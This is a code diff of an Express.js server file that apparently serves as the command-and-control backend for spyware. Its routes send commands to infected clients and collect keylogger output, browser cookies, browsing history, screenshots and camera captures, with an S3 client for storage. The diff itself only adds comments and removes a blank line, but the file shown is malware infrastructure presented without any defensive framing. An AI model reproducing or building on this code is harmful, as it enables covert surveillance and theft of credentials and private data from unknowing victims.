@@ -9,6 +9,7 @@ import clientController from "./controllers/client_controller.js";
 import {fromNodeProviderChain} from "@aws-sdk/credential-providers";
 import {apiReference} from "@scalar/express-api-reference";
 
+// Initialize AWS S3 client
 export const s3Client = new S3Client({region: process.env.AWS_S3_REGION, credentials: fromNodeProviderChain()});
 
 const app = express();
@@ -30,6 +31,12 @@ app.use(
     }),
 )
 
+/**
+ * Routes are defined bellow.
+ *
+ * Each route has a path and a controller handler function.
+ */
+
 // Client routes
 app.get('/clients', clientController.index)
 app.post(`/clients/send-command`, clientController.sendCommand)
@@ -37,7 +44,6 @@ app.post(`/clients/send-command`, clientController.sendCommand)
 // Collector routes
 app.get('/collector/screenshot', collectorController.listScreenshots)
 app.get('/collector/camera', collectorController.listCameraCaptures)
-
 app.post('/collector/key-logger', collectorController.saveKeys);
 app.post('/collector/cookies', collectorController.saveCookies)
 app.post('/collector/history', collectorController.saveHistory)
